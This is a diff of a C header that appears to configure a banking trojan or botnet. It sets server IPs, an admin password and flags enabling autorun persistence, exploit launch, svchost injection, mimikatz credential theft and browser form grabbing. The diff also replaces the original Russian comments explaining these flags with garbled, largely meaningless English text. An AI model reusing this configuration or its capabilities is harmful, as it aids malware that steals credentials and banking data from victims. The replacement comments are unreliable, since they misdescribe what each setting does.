@@ -1,6 +1,6 @@
 #pragma once
 
-//дебаг версия 
+// Dedicated to
 #include "..\builder.h"
 
 //#define ADMIN_PANEL_HOSTS ""
@@ -14,59 +14,64 @@
 //#define VIDEO_SERVER_IP "80.84.49.50:443"
 //#define VIDEO_SERVER_IP "52.11.125.44:443"
 //#define FLAGS_VIDEO_SERVER "0000005"
-//настройки для бэкконнект сервера
-//позиция 0: запускать в отдельном свцхосте или нет
-//		  1: запускать или нет в спящем режиме
-//		  2-6: через сколько минут бездействия отключаться от сервера
+
+// Settling up for the bounds of the system
+// Completion 0: Add to the list of required resources.
+// 1: Add or delete files in the runtime.
+// 2-6: to increase the number of lines on the line to set the value
 #define FLAGS_VIDEO_SERVER "0000099"
 //#define FLAGS_VIDEO_SERVER "1000099"
 #define ADMIN_PASSWORD "1He9Psa7LzB1wiRn"
 //#define ADMIN_PASSWORD "1234567812345678"
 #define PREFIX_NAME "myt"
 #define PERIOD_CONTACT "30"
-//различные настройки бота
-//позиция 0 - отключена или включена инсталяция в автозагрузку
-//		  1 - отключен или включен запуск сплойта
-//		  2 - включена или отключена проверка запуска копии
-//		  3 - плагины закачиваются в сервера (1), иначе с админки (0)
-//		  4 - включена или нет работа в запущенном процессе без инжектов в svchost.exe
+
+// Difficult Contributions
+// Completion 0 - Interconnection or Subject Attunement
+// 1 - the endpoint or the endpoint endpoint
+// 2 - end-to-end and end-to-end operation heading
+// 3 - the conditions of starting the system (1), the initial version of the system (0)
+// 4 - a log in or not working in svchost.exe in svchost.exe
 //#define MISC_STATE "10111"
 #define MISC_STATE "10110"
 
-//настройки для отключения разных функций
-//отключить установку сервиса
-//#define OFF_SERVICE
-//#define OFF_SDPROP
-//отключить установку в автозапуск (в тот что в меню винды)
-//#define OFF_AUTORUN
-//при запуске не запускаться в свцхосте
-//#define OFF_SVCHOST
-//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
+// Settling up for the connection of distant effects
+// Turning down the system
+// # define OFF_SERVICE
+// # define OFF_SDPROP
+// talk about the settings in the game (in the turn of the time)
+// # define OFF_AUTORUN
+// In the future, when it comes to the development of
+// # define OFF_SVCHOST
+// in the case of the most remote (crooked, crooked) users in the c: \ botdebug
 #define ON_SENDDATA_FOLDER
-//все плагины берутся из папки c:\plugins
+
+// in the process of using the buttons with: \ plugins
 #define ON_PLUGINS_FOLDER
 #define ON_VIDEOSERVER
-//при работе не использовать проводник (не инжектится в него)
+// Inspiration and decontamination of perfomance (in addition in pertinent)
 #define NOT_EXPLORER
-//подключение ифобс
-//#define ON_IFOBS
-//подключение функций из программы mimikatz
+
+// Completion of the image
+// # define ON_IFOBS
+// How to use the mimikatz interface
 #ifndef WIN64
 #define ON_MIMIKATZ
 #endif
-//включает граббинг данных с форм браузера
+
+// Achievement of the control panels
 #define ON_FORMGRABBER
 
-//включение вложенных плагинов
+//closing the backends
 //#define PLUGINS_TRUSTED_HOSTS
 //#define PLUGINS_FIND_OUTLOOK_FILES
 //после поиска нужно завершить работу бота
 //#define PLUGINS_FIND_OUTLOOK_FILES_EXIT
 //#define PLUGINS_MONITORING_FILE
 
-//запрашивает IP админки и при получении корректного адреса запускает серверную часть которая коннектится по этому IP
+// Create IP addresses and use the software to set the quality of the software to use the software for a set of programs using the software to use the software.
 //#define IP_SERVER_FROM_DNS
-//стучать на зашитый внешней прогой IP сервера
+// How to set up a connection with a top-down IP address
 //#define IP_SERVER_EXTERNAL_IP
 
 
